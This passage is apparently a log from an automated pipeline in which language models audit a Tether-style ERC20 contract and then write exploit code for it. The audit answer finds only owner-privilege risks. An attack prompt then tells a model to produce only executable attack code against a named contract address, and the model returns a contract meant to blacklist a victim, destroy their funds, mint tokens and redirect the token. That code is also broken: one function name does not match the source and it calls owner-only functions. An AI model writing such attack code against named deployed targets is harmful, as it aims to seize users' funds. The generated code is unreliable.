super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "1. Contract Analysis:\n\nThe main contract with business logic and user funds is **TetherToken**, which is an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Supports pausing/unpausing by owner.\n- Supports blacklisting addresses and destroying their token balances.\n- Has an upgrade mechanism via `deprecated` flag and `upgradedAddress` to forward calls to a new contract.\n- Implements fees on transfers (basisPointsRate and maximumFee), though initially set to zero.\n- Owner can mint new tokens (`issue`) and burn tokens (`redeem`).\n- Uses SafeMath for arithmetic safety.\n- Implements ERC20 standard functions with some additional checks (e.g., payload size).\n- Has owner-only functions to manage blacklist, upgrade, fees, minting, and burning.\n\nThe other contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`) are standard utility or access control contracts supporting the main token contract.\n\n2. Vulnerability Assessment:\n\n- **Centralization / Owner Privileges**:  \n  The owner has extensive powers:\n  - Can pause/unpause the contract, blocking all transfers.\n  - Can blacklist any address, preventing them from transferring tokens.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.\n  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.\n  - Can burn tokens from their own balance via `redeem()`.\n  - Can upgrade the contract to a new address and redirect all calls.\n  - Can set transfer fees (basis points and max fee).\n  \n  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.\n\n- **No Timelock or Multisig on Owner Actions**:  \n  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.\n\n- **Blacklisting and Destroying Funds**:  \n  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.\n\n- **Upgrade Mechanism Risks**:  \n  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.\n\n- **No Reentrancy or Math Vulnerabilities**:  \n  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.\n\n- **ERC20 Approve Race Condition Mitigated**:  \n  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **No ETH Handling**:  \n  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.\n\n3. Exploitation Requirements:\n\n- To exploit the centralization risks, an attacker must gain control of the owner private key or compromise the owner account.\n\n- No direct vulnerabilities allow a non-owner to exploit or steal tokens.\n\n- The owner can arbitrarily blacklist and destroy tokens of any user at any time.\n\n- The owner can mint unlimited tokens, diluting existing holders.\n\n- The owner can upgrade the contract to a malicious version, redirecting all token logic.\n\n---\n\n**Summary:**\n\n- **Solidity Version:** pragma solidity ^0.4.17\n\n- **Main Vulnerabilities:**  \n  - Centralized owner control with powerful privileges (blacklist, destroy funds, mint, pause, upgrade).  \n  - No multisig or timelock on sensitive owner operations.  \n  - Blacklist and destroy funds feature is a backdoor to confiscate tokens.  \n  - Upgrade mechanism can be abused by owner to replace contract logic maliciously.\n\n- **No technical bugs like reentrancy, arithmetic, or unsafe calls found.**\n\n- **Users must trust the owner fully; compromise or malicious intent by owner leads to loss of funds or censorship.**", 'contract_analysis': 'The main contract with business logic and user funds is **TetherToken**, which is an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Supports pausing/unpausing by owner.\n- Supports blacklisting addresses and destroying their token balances.\n- Has an upgrade mechanism via `deprecated` flag and `upgradedAddress` to forward calls to a new contract.\n- Implements fees on transfers (basisPointsRate and maximumFee), though initially set to zero.\n- Owner can mint new tokens (`issue`) and burn tokens (`redeem`).\n- Uses SafeMath for arithmetic safety.\n- Implements ERC20 standard functions with some additional checks (e.g., payload size).\n- Has owner-only functions to manage blacklist, upgrade, fees, minting, and burning.\n\nThe other contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`) are standard utility or access control contracts supporting the main token contract.\n\n2.', 'vulnerability_assessment': "- **Centralization / Owner Privileges**:  \n  The owner has extensive powers:\n  - Can pause/unpause the contract, blocking all transfers.\n  - Can blacklist any address, preventing them from transferring tokens.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.\n  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.\n  - Can burn tokens from their own balance via `redeem()`.\n  - Can upgrade the contract to a new address and redirect all calls.\n  - Can set transfer fees (basis points and max fee).\n  \n  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.\n\n- **No Timelock or Multisig on Owner Actions**:  \n  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.\n\n- **Blacklisting and Destroying Funds**:  \n  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.\n\n- **Upgrade Mechanism Risks**:  \n  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.\n\n- **No Reentrancy or Math Vulnerabilities**:  \n  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.\n\n- **ERC20 Approve Race Condition Mitigated**:  \n  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **No ETH Handling**:  \n  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.\n\n3.", 'exploitation_requirements': '- To exploit the centralization risks, an attacker must gain control of the owner private key or compromise the owner account.\n\n- No direct vulnerabilities allow a non-owner to exploit or steal tokens.\n\n- The owner can arbitrarily blacklist and destroy tokens of any user at any time.\n\n- The owner can mint unlimited tokens, diluting existing holders.\n\n- The owner can upgrade the contract to a malicious version, redirecting all token logic.', 'analysis_duration': 31.40373992919922}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The main contract with business logic and user funds is **TetherToken**, which is an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Supports pausing/unpausing by owner.\n- Supports blacklisting addresses and destroying their token balances.\n- Has an upgrade mechanism via `deprecated` flag and `upgradedAddress` to forward calls to a new contract.\n- Implements fees on transfers (basisPointsRate and maximumFee), though initially set to zero.\n- Owner can mint new tokens (`issue`) and burn tokens (`redeem`).\n- Uses SafeMath for arithmetic safety.\n- Implements ERC20 standard functions with some additional checks (e.g., payload size).\n- Has owner-only functions to manage blacklist, upgrade, fees, minting, and burning.\n\nThe other contracts (`Ownable`, `Pausable`, `BlackList`, `StandardToken`, `BasicToken`) are standard utility or access control contracts supporting the main token contract.\n\n2.\n\nVulnerability Assessment: - **Centralization / Owner Privileges**:  \n  The owner has extensive powers:\n  - Can pause/unpause the contract, blocking all transfers.\n  - Can blacklist any address, preventing them from transferring tokens.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating tokens.\n  - Can mint unlimited tokens via `issue()`, inflating supply arbitrarily.\n  - Can burn tokens from their own balance via `redeem()`.\n  - Can upgrade the contract to a new address and redirect all calls.\n  - Can set transfer fees (basis points and max fee).\n  \n  **Impact**: This centralization means the owner can censor users, confiscate tokens, inflate supply, or replace the contract logic arbitrarily. This is a trust assumption risk rather than a direct bug, but critical for users to understand.\n\n- **No Timelock or Multisig on Owner Actions**:  \n  All owner functions are single-signature and immediate. No delays or multisig protections exist for sensitive operations like blacklisting, destroying funds, minting, or upgrading.\n\n- **Blacklisting and Destroying Funds**:  \n  The owner can blacklist any user and then call `destroyBlackFunds` to zero their balance and reduce total supply. This is a backdoor to confiscate tokens from any user.\n\n- **Upgrade Mechanism Risks**:  \n  When deprecated, all calls forward to the `upgradedAddress`. The owner can set this address arbitrarily. If the owner sets a malicious upgraded contract, users' tokens and balances can be manipulated or stolen.\n\n- **No Reentrancy or Math Vulnerabilities**:  \n  The contract uses SafeMath and does not handle ETH or external calls, so no reentrancy or arithmetic overflow/underflow issues are present.\n\n- **ERC20 Approve Race Condition Mitigated**:  \n  The `approve` function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **No ETH Handling**:  \n  The contract does not accept or hold ETH, so no direct ETH theft or locking issues.\n\n3.\n\nExploitation Requirements: - To exploit the centralization risks, an attacker must gain control of the owner private key or compromise the owner account.\n\n- No direct vulnerabilities allow a non-owner to exploit or steal tokens.\n\n- The owner can arbitrarily blacklist and destroy tokens of any user at any time.\n\n- The owner can mint unlimited tokens, diluting existing holders.\n\n- The owner can upgrade the contract to a malicious version, redirecting all token logic.\n\n\nTarget Contract Address: 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint amount) external;\n    function redeem(uint amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedMalicious) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.deprecate(upgradedMalicious);\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint amount) external;\n    function redeem(uint amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedMalicious) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.deprecate(upgradedMalicious);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.320787191390991}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpllgr4ea4.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": 